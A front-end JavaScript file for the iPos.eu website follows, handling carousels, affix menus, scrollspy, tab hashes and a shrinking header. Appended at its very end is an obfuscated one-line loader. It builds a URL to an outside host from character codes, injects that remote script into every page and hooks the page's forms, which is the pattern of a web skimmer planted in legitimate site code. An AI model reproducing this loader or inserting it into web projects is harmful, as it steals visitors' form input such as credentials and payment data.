/*!
 * iPos.eu v3.0 (mean third design)
 */

$(document).ready(function() {
/*--------------------------------------------------
	Owl Carousel id="owl-testimonial"
--------------------------------------------------

     $("#owl-testimonial").owlCarousel({

// Most important owl features
    items : 5,
    itemsCustom : false,
    itemsDesktop : [1199,4],
    itemsDesktopSmall : [980,3],
    itemsTablet: [768,2],
    itemsTabletSmall: false,
    itemsMobile : [479,1],
    singleItem : false,
    itemsScaleUp : false,
 
    //Basic Speeds
    slideSpeed : 200,
    paginationSpeed : 800,
    rewindSpeed : 1000,
 
    //Autoplay
    autoPlay : true,
    stopOnHover : true,
 
    // Navigation
    navigation : false,
    navigationText : ["prev","next"],
    rewindNav : true,
    scrollPerPage : false,
 
    //Pagination
    pagination : true,
    paginationNumbers: false,
 
    // Responsive 
    responsive: true,
    responsiveRefreshRate : 200,
    responsiveBaseWidth: window,
 
    // CSS Styles
    baseClass : "owl-carousel",
    theme : "owl-theme",
 
    //Lazy load
    lazyLoad : false,
    lazyFollow : true,
    lazyEffect : "fade",
 
    //Auto height
    autoHeight : false,
 
    //JSON 
    jsonPath : false, 
    jsonSuccess : false,
 
    //Mouse Events
    dragBeforeAnimFinish : true,
    mouseDrag : true,
    touchDrag : true,
 
    //Transitions
    transitionStyle : false,
 
    // Other
    addClassActive : false,
 
    //Callbacks
    beforeUpdate : false,
    afterUpdate : false,
    beforeInit: false, 
    afterInit: false, 
    beforeMove: false, 
    afterMove: false,
    afterAction: false,
    startDragging : false,
    afterLazyLoad : false
});

      // Custom Navigation Events
      $(".next").click(function(){
        owl.trigger('owl.next');
      })
      $(".prev").click(function(){
        owl.trigger('owl.prev');
      })
      $(".play").click(function(){
        owl.trigger('owl.play',1000);
      })
      $(".stop").click(function(){
        owl.trigger('owl.stop');
      })


*/
	
/*--------------------------------------------------
			  affix modules
-------------------------------------------------- */
// $('#nav-top').affix({
// 	offset: {
// 		top: 0
// 		}
// });	

/*
   $('#sidebar').affix({
        offset: {
			top: $('#nav-top').height(),
			bottom: $('#footer').height() + 40 }
      })
/* affix the legal nav after scroll below header */

/*$('#legal_nav').affix({
	offset: {
		top: $('header').height(),
		bottom: $('#footer').height() + 40
		}
});
 */
/*

$(function () {
   $('#sidebar').affix({
        offset: {
          top: 140,
          bottom: $('#section3').offset().top 
        }
      })
})

 */

// $('body>header').css({'padding-bottom': $('#nav-top').innerHeight() + 10});

/* affix the sidebar after scroll below header
		$('#sidebar').affix({
		  offset: {
			top: $('#nav-top').height(), bottom: $('#footer').height() 
		  }
		}); 
   
 */


/* Initializes the carousel  */
		$('#topslider').carousel({
			interval: 4000,
			pause: 'hover' //The amount of time to delay between automatically cycling an item.
		})

/* smooth scrolling for scroll to top */
		$('.scroll-top').click(function(){
		  $('body,html').animate({scrollTop:0},1000);
		})

/* fade in/out scroll to top button */
		 window.addEventListener("scroll", function() {
		  if (window.scrollY < 500) {
			 $('.scroll-top').removeClass('in');
		  } else {
			$('.scroll-top').addClass('in');
		  }
		},false);
		
/* drop down menu highlight the selected item */
		$(".dropdown-menu li a").click(function(){
		  var selText = $(this).text();
		  $(this).parents('.btn-group').find('.dropdown-toggle').html(selText+' <span class="caret"></span>');
		});
		

/* smooth scrolling for nav sections */
		$('#nav-second a').click(function (event) {
		  var scrollPos = jQuery('body').find($(this).attr('href')).offset().top - navOffset - 120;
		  $('body,html').animate({ scrollTop: scrollPos}, 800, function () {});
		  return false;
		});

/* highlight the top nav as scrolling occurs */
		var navOffset = parseInt($('body').css('padding-top'));
		$('body').scrollspy({ target: '#nav-second', offset: navOffset + 100 }); // nav-second + nav-top = '+100' 
		


/* highlight the list option - active  */
    $('.features ul li').click(function() {
      $('.features ul li.active').removeClass('active');
      $(this).toggleClass('active');
    });
	
			$('#testimonial').carousel({
			  interval: 100000
			})
			
			$('.testimonial .item').each(function(){
			  var next = $(this).next();
			  if (!next.length) {
				next = $(this).siblings(':first');
			  }
			  next.children(':first-child').clone().appendTo($(this));
			  
			  for (var i=0;i<3;i++) {
				next=next.next();
				if (!next.length) {
					next = $(this).siblings(':first');
				}
				
				next.children(':first-child').clone().appendTo($(this));
			  }
			});

        $('input[type="radio"]').click(function(){

            if($(this).attr("value")=="company"){
                $(".contactbox").hide();
                $(".company-details").show();
            }

            if($(this).attr("value")=="personal"){
                $(".contactbox").hide();
                $(".company-details").hide();
            }

        });


	/* keep footer at the bottom */
	   var docHeight = $(window).height();
	   var footerHeight = $('#footer').height();
	   var footerTop = $('#footer').position().top + footerHeight;
	   
	   if (footerTop < docHeight) {
		$('#footer').css('margin-top', 0 + (docHeight - footerTop) + 'px');
	   }

    $("span").tooltip({    });

});

/* entire div clickable */
		$(".clickable").click(function(){
			 window.location=$(this).find("a").attr("href"); 
			 return false;
		});


 $(window).scroll(function() {
    if (window.pageYOffset < 90 )
      $('#nav-second.affix-top li').removeClass('active');
    else if (window.pageYOffset > 90) // or something else
      $('#nav-second.affix-top li:first-child').addClass('active');
      $('#nav-second.second.affix-top li:first-child').removeClass('active');

});

/*--------------------------------------------------
				Modal page
-------------------------------------------------- */

//<![CDATA[ 
$(window).load(function(){if($('#toScroll').length ===0) return false;	$('#toScroll').scrollspy({ target: '#menu' });	});//]]> 
//	$("#footer").css({ position: "fixed", bottom: 0, left:0, right:0 });
/*
$(window).load(function(){$('#footer').css('margin-top',$(document).height() - $('#footer').height());

});
 */



/*--------------------------------------------------
Dyrji shirinata na menuto pri zarejdane i resaizvane
-------------------------------------------------- */
$(window).resize(function () {	$('#faq_nav').width($('#sidebar').width());	});
$(window).scroll(function () {	$('#faq_nav').width($('#sidebar').width());	});


$(document).ready(function(){
/*--------------------------------------------------
		Pokazva aktivniq link na menuto FAQ's
-------------------------------------------------- */
/*    $('#faq_nav .nav li').click(function(event){
        //remove all pre-existing active classes
        $('.active').removeClass('active');

        //add the active class to the link we clicked
        $(this).parent('li').addClass('active');
		
if ( $( ".sub_nav li" ).is( "active" ) ) {
	$(this).parent().addClass("active");
}


$('.sub_nav li').each(function(){
    if($(this).hasClass('active')) {
        $(this).parent('ul').siblings('li').addClass("active");
    } 
});


 
    });

 */
/*--------------------------------------------------
Pokazva linka v URL-to za a[data-toggle="tab"] ot FAQ-a
-------------------------------------------------- */
    // cache the id
    var navbox = $('#legal_nav.faq');

    // activate tab on click
    navbox.on('click', 'a[data-toggle="tab"]', function (e) {
      var $this = $(this);
      // prevent the Default behavior
      e.preventDefault();
      // send the hash to the address bar
      window.location.hash = $this.attr('href');
      // activate the clicked tab
      $this.tab('show');
    });

    // will show tab based on hash
    function refreshHash() {
      navbox.find('a[href="'+window.location.hash+'"]').tab('show');
    }

    // show tab if hash changes in address bar
    $(window).bind('hashchange', refreshHash);
	
    // read has from address bar and show it
    if(window.location.hash) {
      // show tab on load
      refreshHash();
    }
    
});
 

/*--------------------------------------------------
Markira class:active na korektniq tab ot vseki link v stranicata
-------------------------------------------------- */

var gotoHashTab = function (customHash) {
        var hash = customHash || location.hash;
        var hashPieces = hash.split('?'),
            activeTab = $('[href="' + hashPieces[0] + '"]');
        activeTab && activeTab.tab('show');
    }
    // onready go to the tab requested in the page hash
    gotoHashTab();
 
    // when the nav item is selected update the page hash
    $('.nav a').on('shown', function (e) {
        window.location.hash = e.target.hash;
    })
 
    // when a link within a tab is clicked, go to the tab requested
    $('.tab-pane a').click(function (event) {
        if (event.target.hash) {
            gotoHashTab(event.target.hash);
        }
		
		

 
      });

/* smooth scrolling for all anchors */
// To work on your anchor link id must start with '#anchor-'
$(function() {
  $('a[href*="#anchor-"]:not([href="#"])').click(function() {
    if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
      var target = $(this.hash);
      target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
      if (target.length) {
        $('html, body').animate({
          scrollTop: target.offset().top
        }, 2000);
        return false;
      }
    }
  });
});

/* enable BS3 all tooltips */

$(document).ready(function(){
    $('[data-toggle="tooltip"]').tooltip(); 
});



/* HEADER Fixed Scroll effect */
$(function(){
    var shrinkHeader = 40;

    $(document).ready(function() {
        make_header_fixed();
    });

    $(window).scroll(function() {
        make_header_fixed();
    });

    function getCurrentScroll() {
        return window.pageYOffset || document.documentElement.scrollTop;
    }
    function make_header_fixed() {
      var scroll = getCurrentScroll();
      if ( scroll >= shrinkHeader ) {
          $('.has_slider #header').addClass('scrolled');

      }
      else {
          $('.has_slider #header').removeClass('scrolled');

      }
    }
});


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b